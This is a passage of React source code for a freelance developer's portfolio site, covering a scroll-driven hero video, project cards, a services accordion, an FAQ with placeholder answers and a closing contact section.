  const vw = typeof window !== "undefined" ? window.innerWidth : 0;
  const vh = typeof window !== "undefined" ? window.innerHeight : 0;
  const lerp = (a, b, t) => a + (b - a) * t;
  const videoBox = !slot
    ? null
    : pinDone
      // Pin released: hold fullscreen and scroll away with the page 1:1.
      ? { top: PIN_LENGTH - scrollY, left: 0, width: vw, height: vh, radius: 0 }
      : {
          top: lerp(slot.top, 0, progress),
          left: lerp(slot.left, 0, progress),
          width: lerp(slot.w, vw, progress),
          height: lerp(slot.h, vh, progress),
          radius: lerp(10, 0, progress),
        };
  const hasVideo = Boolean(videoBox);
  useEffect(() => {
    if (!hasVideo || !heroVideoRef.current) return;
    const video = heroVideoRef.current;
    const startPlayback = () => {
      video.muted = true;
      video.play().catch(() => {});
    };
    if (video.readyState >= 2) startPlayback();
    else video.addEventListener("loadeddata", startPlayback, { once: true });
    return () => video.removeEventListener("loadeddata", startPlayback);
  }, [hasVideo]);
  useEffect(() => { const t = setTimeout(() => setVis(true), 150); return () => clearTimeout(t); }, []);

  return (
    // Outer wrapper is taller than the viewport by PIN_LENGTH â€” that extra
    // height is the scroll distance the pin consumes. No overflow:hidden here,
    // it would break position:sticky on the inner element.
    <section id="hero" style={{
      position: "relative",
      height: isMobile ? "auto" : `calc(88vh + ${PIN_LENGTH}px)`,
    }}>
    <div style={{
      position: isMobile ? "relative" : "sticky", top: 0,
      minHeight: isMobile ? "auto" : "88vh",
      display: "flex", flexDirection: "column",
      justifyContent: "space-between",
      padding: "clamp(96px,8vh,112px) clamp(20px,3.5vw,60px) 56px",
      overflow: "hidden",
    }}>
      {/* Invisible slot â€” marks where the docked video sits in the hero layout.
          Measured once (and on resize) so the fixed video knows its home. */}
      {!isMobile && (
        <div
          ref={videoSlotRef}
          aria-hidden="true"
          style={{
            position: "absolute", top: "clamp(159px,9vw,100px)", right: "clamp(20px,5vw,60px)",
            width: "clamp(160px,13.5vw,230px)", height: "clamp(85px,7.2vw,125px)",
            pointerEvents: "none", visibility: "hidden",
          }}
        />
      )}

      {/* Project preview video â€” geometry is driven straight off scroll
          position, with no CSS transition, so it tracks the scrub exactly. */}
      {!isMobile && videoBox && (
        <div
          onMouseEnter={() => setVideoHov(true)}
          onMouseLeave={() => setVideoHov(false)}
          style={{
            position: "fixed",
            top: videoBox.top, left: videoBox.left,
            width: videoBox.width, height: videoBox.height,
            borderRadius: videoBox.radius, overflow: "hidden",
            border: progress > 0.02 ? "none" : "1px solid rgba(255,255,255,0.28)",
            zIndex: progress > 0 ? 20 : 2,
            opacity: vis ? 1 : 0,
            willChange: "top, left, width, height",
            transition: "opacity 1s cubic-bezier(0.16,1,0.3,1) 0.3s",
          }}
        >
          <video
            ref={heroVideoRef}
            src="/Hero%20Section.mp4"
            autoPlay loop playsInline muted={videoMuted} preload="metadata"
            poster="/new%20projects.jpg"
            style={{ width: "100%", height: "100%", objectFit: "cover", display: "block" }}
          />
          <button
            onClick={() => setVideoMuted(m => !m)}
            aria-label={videoMuted ? "Unmute video" : "Mute video"}
            style={{
              position: "absolute", top: "50%", left: "50%", transform: "translate(-50%,-50%)",
              width: 34, height: 34, borderRadius: "50%",
              background: "rgba(2,6,10,0.65)", border: "1px solid rgba(255,255,255,0.4)",
              display: "flex", alignItems: "center", justifyContent: "center",
              color: "#eef2f6", cursor: "pointer",
              opacity: videoHov ? 1 : 0, pointerEvents: videoHov ? "auto" : "none",
              transition: "opacity 0.25s ease",
            }}
          >
            {videoMuted ? (
              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M11 5 6 9H2v6h4l5 4V5z" strokeLinejoin="round" />
                <line x1="23" y1="9" x2="17" y2="15" strokeLinecap="round" />
                <line x1="17" y1="9" x2="23" y2="15" strokeLinecap="round" />
              </svg>
            ) : (
              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M11 5 6 9H2v6h4l5 4V5z" strokeLinejoin="round" />
                <path d="M19.07 4.93a10 10 0 010 14.14M15.54 8.46a5 5 0 010 7.07" strokeLinecap="round" />
              </svg>
            )}
          </button>
        </div>
      )}

      {/* Profile photo â€” sits directly left of the video, same top, small gap
          between them. Tweak the numbers freely in DevTools. */}
      {!isMobile && showProfilePhoto && (
        <div style={{
          position: "absolute",
          // photo bottom lines up with the headline baseline (the "." of SYSTEMS.)
          top: "calc(159px + 1.88 * clamp(44px,10vw,124px) - clamp(130px,13vw,180px))",
          left: "calc(100% - clamp(20px,5vw,60px) - 480px)",
          width: "clamp(130px,13vw,180px)", height: "clamp(130px,13vw,180px)",
          zIndex: 2,
          opacity: vis ? 1 : 0, transform: vis ? "none" : "translateY(-20px)",
          transition: "all 1s cubic-bezier(0.16,1,0.3,1) 0.4s",
        }}>
          <img
            src={aqibPhoto}
            alt="Aqib Faraz"
            style={{
              width: "100%", height: "100%", display: "block",
              objectFit: "cover", objectPosition: "top center",
            }}
          />
          {/* light black overlay */}
          <div style={{
            position: "absolute", inset: 0,
            background: "rgba(0,0,0,0.3)", pointerEvents: "none",
          }} />
        </div>
      )}

      {/* Top block: badge + headline + role. No interactive content in here â€”
          pointerEvents:none stops its empty right-hand space from blocking the
          video/photo/button that sit over it. maxWidth is wide enough for
          "Data. Systems." to stay on one line but capped so it doesn't reach
          under the video/photo column on the right. */}
      <div style={{
        position: "relative", zIndex: 2, pointerEvents: "none",
        maxWidth: isNarrowDesktop ? "72vw" : "min(86vw, 1440px)",
        opacity: vis ? 1 : 0,
        transform: vis ? "none" : "translateY(44px)",
        transition: "all 1.1s cubic-bezier(0.16,1,0.3,1)",
      }}>
        {/* Badge */}
        <div style={{
          display: "flex", alignItems: "center", gap: 14, marginBottom: 28,
          opacity: vis ? 1 : 0, transition: "opacity 0.9s ease 0.25s",
        }}>
          <span style={{ width: 36, height: 1, background: "rgba(255,255,255,0.4)", display: "inline-block", flexShrink: 0 }} />
          <span style={{
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 600,
            fontSize: "clamp(10px,1.1vw,12px)",
            letterSpacing: "0.14em", color: "rgba(255,255,255,0.55)", textTransform: "uppercase",
          }}>Remote - Available Now</span>
        </div>

        {/* Headline */}
        <h1 style={{
          fontFamily: "'Plus Jakarta Sans',sans-serif",
          fontSize: "clamp(44px,11vw,176px)", fontWeight: 800,
          lineHeight: 0.9, color: "#eef2f6",
          margin: "0 0 clamp(18px,2vw,28px)", letterSpacing: "-0.035em",
          textTransform: "uppercase",
        }}>
          <span style={{
            position: "absolute",
            width: 1,
            height: 1,
            padding: 0,
            margin: -1,
            overflow: "hidden",
            clip: "rect(0, 0, 0, 0)",
            whiteSpace: "nowrap",
            border: 0,
          }}>Aqib Faraz - Software, Data &amp; Systems Developer</span>
          <span style={{
            display: "block",
            opacity: vis ? 1 : 0, transform: vis ? "none" : "translateX(-28px)",
            transition: "all 0.95s cubic-bezier(0.16,1,0.3,1) 0.1s",
          }} aria-hidden="true">Software.</span>
          <span style={{
            display: "block",
            opacity: vis ? 1 : 0, transform: vis ? "none" : "translateX(-28px)",
            transition: "all 0.95s cubic-bezier(0.16,1,0.3,1) 0.22s",
          }} aria-hidden="true">Data. Systems.</span>
        </h1>

        {/* Rotating role */}
        <div style={{
          position: "relative", top: -6,
          fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 600,
          fontSize: "clamp(13px,1.6vw,18px)",
          color: "rgba(255,255,255,0.5)",
          height: 28, whiteSpace: "nowrap", overflow: "hidden",
          opacity: vis ? 1 : 0, transition: "opacity 0.9s ease 0.4s",
        }}>
          {typed}
        </div>
      </div>

      {isMobile && (
        <div style={{
          position: "relative", zIndex: 2, width: "100%", height: "clamp(190px,48vw,310px)",
          margin: "clamp(18px,4vw,30px) 0 clamp(20px,5vw,36px)",
          overflow: "hidden", borderRadius: 4, background: "#02060a",
        }}>
          <video
            src="/Hero%20Section.mp4"
            autoPlay loop playsInline muted
            style={{ width: "100%", height: "100%", objectFit: "cover", display: "block" }}
          />
        </div>
      )}

      {/* Bottom block: trust row (left) + paragraph & CTAs (right) */}
      <div style={{
        position: "relative", top: -8, zIndex: 2,
        display: "flex", alignItems: "flex-end", justifyContent: "space-between",
        flexWrap: "wrap", gap: "36px 40px",
        opacity: vis ? 1 : 0,
        transform: vis ? "none" : "translateY(30px)",
        transition: "all 1.1s cubic-bezier(0.16,1,0.3,1) 0.25s",
      }}>
        {/* Trust row */}
        <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
          <div style={{ display: "flex" }}>
            {["/Feedbackimg1.webp", "/feedbackimg2.webp"].map((src, i) => (
              <span key={src} style={{
                width: 42, height: 42, borderRadius: "50%", overflow: "hidden",
                display: "block", background: "transparent",
                marginLeft: i === 0 ? 0 : -12,
              }}>
                <img src={src} alt="Client feedback" style={{
                  width: "100%", height: "100%", display: "block",
                  objectFit: "cover", transform: "scale(1.38)",
                }} />
              </span>
            ))}
          </div>
          <div>
            <div style={{ display: "flex", gap: 2, marginBottom: 4 }}>
              {Array.from({ length: 5 }).map((_, i) => (
                <svg key={i} width="16" height="16" viewBox="0 0 24 24" fill="#ff3b30">
                  <path d="M12 .587l3.668 7.568 8.332 1.151-6.064 5.828 1.48 8.279L12 19.771l-7.416 3.642 1.48-8.279L0 9.306l8.332-1.151z" />
                </svg>
              ))}
            </div>
            <div style={{
              fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 500,
              fontSize: "clamp(11px,1.1vw,13px)",
              letterSpacing: "0.01em", color: "rgba(255,255,255,0.5)",
            }}>Trusted by 150+ clients</div>
          </div>
        </div>

        {/* Paragraph + CTAs */}
        <div style={{ maxWidth: 480 }}>
          <p style={{
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
            fontSize: "clamp(13px,1.3vw,16px)", lineHeight: 1.8,
            color: "rgba(255,255,255,0.45)",
            margin: "0 0 22px",
          }}>
            I build web platforms, automation pipelines, and full-stack products
            solving real business problems with clean, reliable code. Remote-first,
            working with clients across the USA &amp; Europe.
          </p>
          <div style={{ display: "flex", alignItems: "center", gap: 16, flexWrap: "wrap" }}>
            <a href="#work" style={{
              fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 700,
              fontSize: "clamp(12px,1.2vw,13px)", letterSpacing: "0.02em",
              textTransform: "uppercase", background: "#eef2f6", color: "#02060a",
              padding: "16px clamp(28px,3vw,38px)", textDecoration: "none",
              borderRadius: 999, transition: "opacity 0.2s",
            }}
              onMouseEnter={e => e.currentTarget.style.opacity = "0.85"}
              onMouseLeave={e => e.currentTarget.style.opacity = "1"}
            >View Portfolio</a>
            <a href="#work" aria-label="Scroll to work" style={{
              display: "inline-flex", alignItems: "center", justifyContent: "center",
              width: 52, height: 52, borderRadius: "50%",
              border: "1px solid rgba(255,255,255,0.22)", color: "#eef2f6",
              transition: "all 0.25s ease", flexShrink: 0,
            }}
              onMouseEnter={e => { e.currentTarget.style.background = "#eef2f6"; e.currentTarget.style.color = "#02060a"; }}
              onMouseLeave={e => { e.currentTarget.style.background = "transparent"; e.currentTarget.style.color = "#eef2f6"; }}
            >
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M19 12H5M11 6l-6 6 6 6" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            </a>
          </div>
        </div>
      </div>

      <div style={{
        position: "absolute", bottom: 0, left: 0, right: 0, height: 100,
        background: "linear-gradient(to top, #02060a, transparent)",
        zIndex: 1, pointerEvents: "none",
      }} />
      </div>
    </section>
  );
}


// â”€â”€â”€ WORK â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Cover image at rest; the clip fades in and plays on hover. Video only starts
// loading once hovered, so three clips don't all download on page load.
function WorkCard({ p, i, inView }) {
  const [hov, setHov] = useState(false);
  const videoRef = useRef(null);

  useEffect(() => {
    const v = videoRef.current;
    if (!v) return;
    if (hov) { v.play().catch(() => {}); }
    else { v.pause(); v.currentTime = 0; }
  }, [hov]);

  return (
    <a
      href={p.href || "#"}
      target={p.href && p.href !== "#" ? "_blank" : undefined}
      rel="noreferrer"
      onMouseEnter={() => setHov(true)}
      onMouseLeave={() => setHov(false)}
      style={{
        // No fixed ratio â€” the cover image sets the height, so each card ends
        // at its own natural size and the columns stagger by themselves.
        position: "relative",
        overflow: "hidden", background: "#0c0f12",
        display: "block", textDecoration: "none",
        // keep a card from being split across two columns
        breakInside: "avoid", WebkitColumnBreakInside: "avoid",
        marginBottom: "clamp(8px,1vw,14px)",
        opacity: inView ? 1 : 0, transform: inView ? "none" : "translateY(24px)",
        transition: `opacity 0.7s ease ${i * 0.08}s, transform 0.7s ease ${i * 0.08}s`,
      }}
    >
      {/* In normal flow â€” this image is what gives the card its height */}
      <img
        src={p.image}
        alt={p.title}
        style={{
          display: "block", width: "100%", height: "auto",
          transform: hov ? "scale(1.04)" : "scale(1)",
          opacity: hov ? 0 : 1,
          transition: "transform 0.6s ease, opacity 0.4s ease",
        }}
      />
      {hov && (
        <video
          ref={videoRef}
          src={p.video}
          muted loop playsInline preload="none"
          style={{
            position: "absolute", inset: 0, width: "100%", height: "100%",
            objectFit: "cover",
          }}
        />
      )}
      <div style={{
        position: "absolute", inset: 0,
        background: "linear-gradient(to top, rgba(0,0,0,0.75) 0%, rgba(0,0,0,0.1) 45%, transparent 70%)",
      }} />
      <div style={{
        position: "absolute", left: 20, right: 20, bottom: 18,
        display: "flex", alignItems: "flex-end", justifyContent: "space-between",
        gap: 12,
      }}>
        <div style={{
          fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 500,
          fontSize: "clamp(18px,2vw,26px)", color: "#eef2f6", letterSpacing: "0.01em",
        }}>{p.title}</div>
        <div style={{
          fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
          fontSize: "clamp(11px,1vw,14px)", color: "rgba(255,255,255,0.6)",
          textAlign: "right", lineHeight: 1.35,
        }}>
          {p.category}<br />{p.type}
        </div>
      </div>
    </a>
  );
}

// â”€â”€â”€ SERVICES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Accordion list. `items` / `image` per service are still to be filled in â€”
// a row with no items just shows the CTA when opened.
const SERVICES_LIST = [
  {
    id: "01", title: "Website development", href: "#become-client",
    video: "/web%20development.mp4",
    items: [
      { label: "Angular Website Development" },
      { label: "Laravel Website Development" },
      { label: "Node.js Website Development" },
      { label: "React Website Development" },
      { label: "Vue.js Website Development" },
      { label: "WordPress Website Development" },
    ],
  },
  {
    id: "02", title: "Branding and design", href: "#become-client",
    video: "/branding-and-design.mp4",
    items: [
      { label: "Logo & Brand Guidelines" },
      { label: "Landing Page Design" },
      { label: "Online Store Design" },
      { label: "Custom Website Design" },
      { label: "UI/UX Website Design" },
    ],
  },
  {
    id: "03", title: "CRM system", href: "#become-client",
    image: "/service-crm.webp",
    items: [
      { label: "Automotive Industry" },
      { label: "Real Estate Agency" },
      { label: "Outsourcing Company" },
      { label: "Building company" },
      { label: "Client Database Management" },
      { label: "Manufacturing" },
      { label: "Online Store" },
      { label: "Cafes & Restaurants" },
      { label: "Call Center" },
      { label: "Delivery Service" },
      { label: "Landing Page" },
      { label: "Logistics Company" },
      { label: "Store" },
    ],
  },
  {
    id: "04", title: "E-commerce", href: "#become-client",
    image: "/E-commer.webp",
    items: [
      { label: "E-commerce Website Development" },
      { label: "OpenCart Website Development" },
      { label: "Shopify Website Development" },
    ],
  },
  { id: "05", title: "Landing page", items: [], video: "/Landingpage.mp4", href: "#become-client" },
  { id: "06", title: "Website support", items: [], video: "/Sitesupport.mp4", href: "#become-client" },
  { id: "07", title: "Redesign", items: [], image: "/redesign.webp", href: "#become-client" },
  {
    id: "08", title: "Application development", href: "#become-client",
    image: "/service-app-dev-1.webp",
    items: [
      { label: "Android Apps" },
      { label: "iOS Apps" },
    ],
  },
  { id: "09", title: "Search engine optimisation", items: [], video: "/SEO.mp4", href: "#become-client" },
];

function ServiceRow({ s, open, onToggle }) {
  const [hov, setHov] = useState(false);
  return (
    <div style={{ borderTop: "1px solid rgba(255,255,255,0.14)" }}>
      <button
        onClick={onToggle}
        onMouseEnter={() => setHov(true)}
        onMouseLeave={() => setHov(false)}
        aria-expanded={open}
        style={{
          width: "100%", border: "none", cursor: "pointer",
          display: "flex", alignItems: "center", gap: "clamp(16px,2.5vw,40px)",
          padding: "clamp(20px,2.6vw,36px) 0",
          textAlign: "left",
          color: open || hov ? "#eef2f6" : "rgba(255,255,255,0.75)",
          background: "transparent",
          transition: "color 0.25s ease",
        }}
      >
        {/* arrow: diagonal when closed, straight down when open */}
        {/* points straight down when open â€” and on hover, so it reads as clickable */}
        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor"
          strokeWidth="1.4" style={{
            flexShrink: 0,
            transform: open || hov ? "rotate(-45deg)" : "none",
            transition: "transform 0.35s cubic-bezier(0.25,1,0.5,1)",
          }}>
          <path d="M6 6l12 12M18 8v10H8" strokeLinecap="round" strokeLinejoin="round" />
        </svg>
        <span style={{
          flex: 1,
          fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
          fontSize: "clamp(22px,3vw,42px)", letterSpacing: "-0.01em",
        }}>{s.title}</span>
        <span style={{
          fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
          fontSize: "clamp(14px,1.4vw,20px)", color: "rgba(255,255,255,0.75)",
        }}>{s.id}</span>
        {/* tick marks; the leading one grows into a solid bar on hover/open */}
        <span style={{ display: "flex", alignItems: "center", gap: 5, flexShrink: 0 }} aria-hidden="true">
          <span style={{
            width: 1,
            height: open || hov ? "clamp(30px,3.2vw,48px)" : "clamp(12px,1.3vw,18px)",
            background: open || hov ? "#eef2f6" : "rgba(255,255,255,0.45)",
            display: "block", transition: "height 0.25s ease, background 0.25s ease",
          }} />
          {Array.from({ length: 8 }).map((_, i) => (
            <span key={i} style={{
              width: 1, height: "clamp(12px,1.3vw,18px)",
              background: "rgba(255,255,255,0.45)", display: "block",
            }} />
          ))}
        </span>
      </button>

      {open && (
        <div style={{
          display: "flex", flexWrap: "wrap", gap: "clamp(24px,3vw,56px)",
          padding: "0 0 clamp(32px,4vw,56px)",
        }}>
          {/* items at the top, CTA pinned to the bottom so it lines up with the
              bottom edge of the media on the right */}
          <div style={{
            flex: "1 1 420px", minWidth: 280,
            display: "flex", flexDirection: "column", justifyContent: "space-between",
          }}>
            {s.items.length > 0 && (
              <div style={{
                display: "grid", gridTemplateColumns: "repeat(auto-fit,minmax(200px,1fr))",
                gap: "clamp(12px,1.4vw,20px) clamp(24px,3vw,48px)",
              }}>
                {s.items.map(it => (
                  <a key={it.label} href={it.href || s.href} style={{
                    display: "flex", alignItems: "flex-start", gap: 10,
                    fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
                    fontSize: "clamp(14px,1.3vw,18px)", lineHeight: 1.45,
                    color: "rgba(255,255,255,0.8)", textDecoration: "none",
                    transition: "opacity 0.2s",
                  }}
                    onMouseEnter={e => e.currentTarget.style.opacity = "0.6"}
                    onMouseLeave={e => e.currentTarget.style.opacity = "1"}
                  >
                    <span style={{
                      width: 5, height: 5, borderRadius: "50%", marginTop: 8,
                      border: "1px solid rgba(255,255,255,0.5)", flexShrink: 0,
                    }} />
                    {it.label}
                  </a>
                ))}
              </div>
            )}
            {/* marginTop:auto keeps the CTA at the bottom even when a service
                has no items above it */}
            <div style={{ display: "flex", alignItems: "center", gap: 12, marginTop: "auto", paddingTop: "clamp(28px,3.5vw,52px)" }}>
              <a href={s.href} style={{
                fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 700,
                fontSize: "clamp(11px,1.1vw,13px)", letterSpacing: "0.04em",
                textTransform: "uppercase", background: "#eef2f6", color: "#02060a",
                borderRadius: 999, padding: "clamp(14px,1.4vw,20px) clamp(24px,2.4vw,34px)",
                textDecoration: "none", transition: "opacity 0.2s",
              }}
                onMouseEnter={e => e.currentTarget.style.opacity = "0.85"}
                onMouseLeave={e => e.currentTarget.style.opacity = "1"}
              >View Service Details</a>
              <a href={s.href} aria-label={`${s.title} details`} style={{
                display: "inline-flex", alignItems: "center", justifyContent: "center",
                width: "clamp(44px,3.6vw,56px)", height: "clamp(44px,3.6vw,56px)",
                borderRadius: "50%", background: "#eef2f6", color: "#02060a", flexShrink: 0,
                transition: "opacity 0.2s",
              }}
                onMouseEnter={e => e.currentTarget.style.opacity = "0.85"}
                onMouseLeave={e => e.currentTarget.style.opacity = "1"}
              >
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8">
                  <path d="M19 12H5M11 6l-6 6 6 6" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
              </a>
            </div>
          </div>

          {s.video ? (
            <video src={s.video} autoPlay muted loop playsInline style={{
              flex: "1 1 380px", maxWidth: "min(100%, 620px)",
              height: "clamp(220px,26vw,380px)", objectFit: "cover", display: "block",
            }} />
          ) : s.image ? (
            <img src={s.image} alt={s.title} style={{
              flex: "1 1 380px", maxWidth: "min(100%, 620px)",
              height: "clamp(220px,26vw,380px)", objectFit: "cover", display: "block",
            }} />
          ) : null}
        </div>
      )}
    </div>
  );
}

// â”€â”€â”€ FAQ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Answers are placeholders â€” send the real copy and I'll drop it in.
const FAQS = [
  { q: "What is the price for development?", a: "" },
  { q: "What terms do I offer?", a: "" },
  { q: "What am I offering for website promotion?", a: "" },
  { q: "How do I estimate the cost?", a: "" },
  { q: "What services does my support service provide?", a: "" },
  { q: "What is the difference between a custom solution and a ready-made solution?", a: "" },
  { q: "How is the website development process conducted?", a: "" },
];

function FaqRow({ item, open, onToggle }) {
  const [hov, setHov] = useState(false);
  return (
    <div style={{ borderTop: "1px solid rgba(255,255,255,0.14)" }}>
      <button
        onClick={onToggle}
        onMouseEnter={() => setHov(true)}
        onMouseLeave={() => setHov(false)}
        aria-expanded={open}
        style={{
          width: "100%", background: "none", border: "none", cursor: "pointer",
          display: "flex", alignItems: "center", justifyContent: "space-between",
          gap: 20, padding: "clamp(18px,2.2vw,30px) 0", textAlign: "left",
          color: open || hov ? "#eef2f6" : "rgba(255,255,255,0.85)",
          transition: "color 0.25s ease",
        }}
      >
        <span style={{
          fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 700,
          fontSize: "clamp(14px,1.3vw,19px)", letterSpacing: "0.01em",
        }}>{item.q}</span>
        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor"
          strokeWidth="1.4" style={{
            flexShrink: 0,
            transform: open || hov ? "rotate(-45deg)" : "none",
            transition: "transform 0.35s cubic-bezier(0.25,1,0.5,1)",
          }}>
          <path d="M6 6l12 12M18 8v10H8" strokeLinecap="round" strokeLinejoin="round" />
        </svg>
      </button>
      {open && (
        <p style={{
          margin: "0 0 clamp(20px,2.4vw,32px)", maxWidth: 720,
          fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
          fontSize: "clamp(14px,1.25vw,17px)", lineHeight: 1.7,
          color: "rgba(255,255,255,0.6)",
        }}>{item.a || "Answer coming soon."}</p>
      )}
    </div>
  );
}

function Faq({ onOpenContact }) {
  const [ref, inView] = useInView();
  const [open, setOpen] = useState(null);
  return (
    <section id="faq" style={{ padding: "clamp(60px,8vw,120px) clamp(20px,5vw,60px)" }}>
      <div ref={ref} style={{
        display: "flex", flexWrap: "wrap", gap: "clamp(24px,3vw,56px)",
        opacity: inView ? 1 : 0, transform: inView ? "none" : "translateY(40px)",
        transition: "all 0.8s ease",
      }}>
        {/* Left card */}
        <div style={{
          flex: "1 1 300px", minWidth: 280, background: "#0c0f12",
          padding: "clamp(28px,3.4vw,48px)",
          display: "flex", flexDirection: "column", justifyContent: "space-between",
          gap: "clamp(48px,7vw,120px)",
        }}>
          <div>
            <div style={{
              width: "clamp(64px,6vw,96px)", height: "clamp(64px,6vw,96px)",
              borderRadius: "50%", background: "#eef2f6", color: "#02060a",
              display: "flex", alignItems: "center", justifyContent: "center",
              fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 800,
              fontSize: "clamp(20px,2vw,30px)", letterSpacing: "-0.02em",
              marginBottom: "clamp(24px,3vw,44px)",
            }}>AF.</div>
            <div style={{
              fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
              fontSize: "clamp(26px,3vw,44px)", letterSpacing: "-0.01em",
              color: "#eef2f6",
            }}>Let&rsquo;s talk</div>
          </div>

          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <button type="button" onClick={() => onOpenContact("left")} style={{
              fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 700,
              fontSize: "clamp(11px,1.05vw,13px)", letterSpacing: "0.04em",
              textTransform: "uppercase", background: "#eef2f6", color: "#02060a",
              borderRadius: 999, padding: "clamp(13px,1.3vw,18px) clamp(20px,2.2vw,30px)",
              border: 0, cursor: "pointer", transition: "opacity 0.2s",
            }}
              onMouseEnter={e => e.currentTarget.style.opacity = "0.85"}
              onMouseLeave={e => e.currentTarget.style.opacity = "1"}
            >Book a Call</button>
            <button type="button" onClick={() => onOpenContact("left")} aria-label="Book a call" style={{
              display: "inline-flex", alignItems: "center", justifyContent: "center",
              width: "clamp(42px,3.4vw,52px)", height: "clamp(42px,3.4vw,52px)",
              borderRadius: "50%", background: "#eef2f6", color: "#02060a", flexShrink: 0,
              transition: "opacity 0.2s",
            }}
              onMouseEnter={e => e.currentTarget.style.opacity = "0.85"}
              onMouseLeave={e => e.currentTarget.style.opacity = "1"}
            >
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8">
                <path d="M19 12H5M11 6l-6 6 6 6" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            </button>
          </div>
        </div>

        {/* Right: heading + questions */}
        <div style={{ flex: "2 1 560px", minWidth: 300 }}>
          <h2 style={{
            margin: "0 0 clamp(36px,5vw,80px)",
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
            fontSize: "clamp(28px,3.8vw,58px)", lineHeight: 1.1,
            letterSpacing: "-0.01em", textTransform: "uppercase", color: "#eef2f6",
          }}>Frequently asked questions and answers</h2>
          <div>
            {FAQS.map((item, i) => (
              <FaqRow
                key={item.q}
                item={item}
                open={open === i}
                onToggle={() => setOpen(open === i ? null : i)}
              />
            ))}
          </div>
        </div>
      </div>
    </section>
  );
}

// â”€â”€â”€ CLOSING CTA â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Big centred headline with the clip sitting inline after "LET'S MOVE".
function ClosingCta({ onOpenContact }) {
  const [ref, inView] = useInView();
  return (
    <section
      id="become-client"
      onClick={e => {
        if (e.target === e.currentTarget) window.location.href = "mailto:Aqibfahraz@gmail.com";
      }}
      style={{ padding: "clamp(70px,9vw,140px) clamp(20px,5vw,60px)", cursor: "pointer" }}
    >
      <div ref={ref} style={{
        textAlign: "center",
        opacity: inView ? 1 : 0, transform: inView ? "none" : "translateY(40px)",
        transition: "all 0.8s ease",
      }}>
        <h2 style={{
          margin: 0,
          fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
          fontSize: "clamp(34px,6.4vw,96px)", lineHeight: 1.12,
          letterSpacing: "-0.02em", textTransform: "uppercase", color: "#eef2f6",
        }}>
          <span style={{
            display: "inline-flex", alignItems: "center", flexWrap: "wrap",
            justifyContent: "center", gap: "clamp(10px,1.4vw,24px)",
          }}>
            Let's Move
            <video
              src="/Contact.mp4"
              autoPlay loop muted playsInline
              style={{
                width: "clamp(96px,13vw,200px)", height: "clamp(56px,7.4vw,112px)",
                objectFit: "cover", display: "block", verticalAlign: "middle",
              }}
            />
          </span>
          <br />
          The World Together
        </h2>

        <div style={{
          display: "flex", alignItems: "center", justifyContent: "center", gap: 12,
          marginTop: "clamp(28px,4vw,56px)",
        }}>
          <button type="button" onClick={() => onOpenContact("right")} style={{
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 700,
            fontSize: "clamp(13px,1.3vw,19px)", letterSpacing: "0.02em",
            textTransform: "uppercase", background: "#eef2f6", color: "#02060a",
            borderRadius: 999, padding: "clamp(16px,1.7vw,26px) clamp(28px,3vw,48px)",
            border: 0, cursor: "pointer", transition: "opacity 0.2s",
          }}
            onMouseEnter={e => e.currentTarget.style.opacity = "0.85"}
